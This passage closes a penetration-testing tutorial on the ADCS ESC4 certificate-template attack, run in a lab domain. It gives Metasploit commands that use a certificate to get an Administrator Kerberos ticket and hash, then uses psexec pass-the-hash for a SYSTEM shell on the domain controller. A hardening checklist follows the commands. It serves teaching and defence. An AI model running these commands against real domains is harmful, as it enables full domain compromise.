+set SMBPass Password@1
+set SMBUser raj
+set alt_upn administrator
+run</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUyWFMQtPnMQUJfWovG8nRITIlrgOjVseOXFM4fwadxCpli7wJ9fZE4jNFe6B1K98SL17e3EnziigzpkWnkxS2sT57wAUbon5xD_PeGqeaJhlfjKocGAaeCKPKvCbecUErmNN5v6JmU7W6lTXF0u5tszxFeR1nUVDsJgRmNSzxKao_HEyEL7dRba_8nyKJ/s16000/26.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="1261" height="465"/></span></p>
+<h5><strong><span style="color: #000000;">Obtain a Kerberos Ticket</span></strong></h5>
+<p><span style="color: #000000;">Use the obtained certificate to request a Kerberos Ticket Granting Ticket (TGT):</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use admin/kerberos/get_ticket
+set action GET_HASH
+set CERT_FILE /root/.msf4/loot/20250402142649_default_192.168.1.48_windows.ad.cs_814382.pfx
+set RHOSTS 192.168.1.48
+set domain ignite.local
+set username administrator
+run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheazXeim4QI9oGPn7fwmdPn4fnIqnfcgnKxAnyUkr9zBZQIgmGf3zX8ecifDYmN8EOiTW-4pvIQc2BpVDSV2Wd53LeeUmT9Vmg1AI2VR0ICnT60_GcI3CTAX-EMShxEaQXU-WUuNK3d3nc3t3JWr3GLWwySKliFktnZ3jLiBG9-XURaOhTZK1FcfINtMnd/s16000/27.png"/></span></p>
+<p><span style="color: #000000;">This module uses the certificate to authenticate and obtain a TGT for the Administrator account.</span></p>
+<h5><strong><span style="color: #000000;">Confirm Access with PsExec</span></strong></h5>
+<p><span style="color: #000000;">With the TGT, confirm domain administrator access by executing a command on the Domain Controller:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.48
+set smbomain ignite.local
+set username administrator
+set smbpass aad3b435b51404eeaad3b435b51404ee:32196b56ffe6f45e294117b91a83bf38
+run</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiy1TWPN6kS8T3WqoC1xgz5qx-TFIfqP_X9JoQboItiwj7gozCcIBXhw6aaGKKVq_o4bUZqLVD7hgbubN-wrs6VBVK-_5PnG_ApVpa7PjTfe1lRHTFz3aW5wrsMtPX0jqLzTlm2xqHhlzAXHVA_fmr4Cy5xi4k0Z6YGmY2zBJV8lHnJ_OHpiGtVzAzf64Qz/s16000/28.png" alt="ADCS ESC4 - Vulnerable Certificate Template Access Control" width="1142" height="594"/></span></p>
+<p><span style="color: #000000;">This uses the current Kerberos TGT to spawn a Meterpreter session as <strong>NT AUTHORITYSYSTEM</strong> on the Domain Controller</span></p>
+<h3><span style="color: #800000;"> Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Limit enrollment</strong> to trusted groups (e.g., Domain Admins).</span></li>
+<li><span style="color: #000000;"><strong>Disable subject name supply</strong>; use AD info only.</span></li>
+<li><span style="color: #000000;"><strong>Restrict EKUs</strong> — remove unnecessary ones like Client Auth.</span></li>
+<li><span style="color: #000000;"><strong>Remove Enrollment Agent flag</strong> unless required.</span></li>
+<li><span style="color: #000000;"><strong>Audit template permissions</strong> (e.g., WriteDACL, WriteOwner).</span></li>
+<li><span style="color: #000000;"><strong>Monitor certificate requests</strong> for anomalies.</span></li>
+<li><span style="color: #000000;"><strong>Harden CA access</strong> — limit admin and network exposure.</span></li>
+<li><span style="color: #000000;"><strong>Review and clean up</strong> unused or misconfigured templates.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact</span> <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/adcs-esc7-vulnerable-certificate-authority-access-control/" title="ADCS ESC7 – Vulnerable Certificate Authority Access Control">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC7 – Vulnerable Certificate Authority Access Control</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/ad-cs-esc5-vulnerable-pki-object-access-control/" title="ADCS ESC5: Vulnerable PKI Object Access Control">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">ADCS ESC5: Vulnerable PKI Object Access Control</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/" rel="prev">ADCS ESC3: Enrollment Agent Template</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/ad-cs-esc5-vulnerable-pki-object-access-control/" rel="next">ADCS ESC5: Vulnerable PKI Object Access Control</a></div></div>
+	</nav>        </div>
